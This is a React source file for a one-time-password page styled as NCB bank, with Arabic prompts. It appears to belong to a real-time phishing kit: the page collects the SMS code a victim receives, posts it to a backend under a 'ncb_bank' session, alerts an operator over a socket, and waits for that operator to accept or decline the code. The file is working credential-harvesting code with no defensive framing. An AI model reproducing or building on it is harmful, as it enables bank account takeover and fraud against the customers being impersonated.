import { useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import NcbLayout from "../components/NcbLayout";
import NcbWaitOverlay from "../components/NcbWaitOverlay";
import { api_route, socket } from "../config/api";
import { useAdminApproval } from "../hooks/useAdminApproval";
import { getSessionId, setSessionId } from "../utils/session";

export default function OtpPage() {
  const navigate = useNavigate();
  const [sessionId, setSessionIdState] = useState(getSessionId);
  const [otp, setOtp] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [localError, setLocalError] = useState("");

  const { waiting, error, startWaiting, clearError } = useAdminApproval({
    sessionId,
    acceptEvent: "acceptLoginOtp",
    declineEvent: "declineLoginOtp",
    onAccept: () => navigate("/success"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLocalError("");
    clearError();

    if (!otp.trim()) {
      setLocalError("الرجاء إدخال رمز التحقق");
      return;
    }

    setSubmitting(true);
    try {
      let id = sessionId;
      if (!id) {
        const { data } = await axios.post(`${api_route}/reg`, {
          form_type: "ncb_bank",
        });
        id = data._id;
        setSessionId(id);
        setSessionIdState(id);
        socket.emit("newUser");
      }

      await axios.post(`${api_route}/ncb/otp/${id}`, {
        loginOtp: otp.trim(),
      });
      socket.emit("loginOtpSubmit", id);
      startWaiting();
    } catch {
      setLocalError("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
    } finally {
      setSubmitting(false);
    }
  };

  const displayError =
    localError ||
    (error ? "رمز التحقق غير صحيح" : "");

  return (
    <NcbLayout>
      <form onSubmit={handleSubmit}>
        <p className="ncb-otp-text">
          تم إرسال رمز التحقق عبر رسالة نصية إلى رقمك المسجل لدينا يرجى إدخال
          الرمز لإتمام العملية الخاصة بك
        </p>

        {displayError && <div className="ncb-error mb-5">{displayError}</div>}

        <input
          className="ncb-input"
          type="text"
          inputMode="numeric"
          maxLength={6}
          value={otp}
          onChange={(e) => {
            setOtp(e.target.value.replace(/\D/g, ""));
            clearError();
            setLocalError("");
          }}
          dir="ltr"
        />

        <button
          className="ncb-btn"
          type="submit"
          disabled={submitting || waiting}
          style={{ marginTop: 24 }}
        >
          تأكيد
        </button>
      </form>

      <NcbWaitOverlay
        visible={waiting}
        message="جاري التحقق من الرمز، يرجى الانتظار..."
      />
    </NcbLayout>
  );
}
